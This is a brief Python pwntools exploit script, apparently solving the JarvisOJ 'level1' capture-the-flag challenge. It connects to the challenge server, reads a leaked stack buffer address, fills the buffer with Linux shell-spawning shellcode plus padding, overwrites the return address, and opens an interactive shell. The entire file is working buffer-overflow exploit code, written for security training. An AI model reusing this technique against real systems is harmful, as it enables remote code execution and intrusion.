# coding:utf-8
from pwn import *

sh = remote('pwn2.jarvisoj.com', 9877)

# sh = process('./level1')
# elf = ELF('./level1')

# 获取buf地址
buf = sh.recvline()[14:22]
# 将16进制地址字符串转换成十进制的地址
buf_addr = int(buf, 16)

# 生成shellcode
shellcode = asm(shellcraft.i386.linux.sh())

payload = shellcode + "A" * (0x88 + 0x4 -len(shellcode)) + p32(buf_addr)

sh.send(payload)
sh.interactive()
sh.close()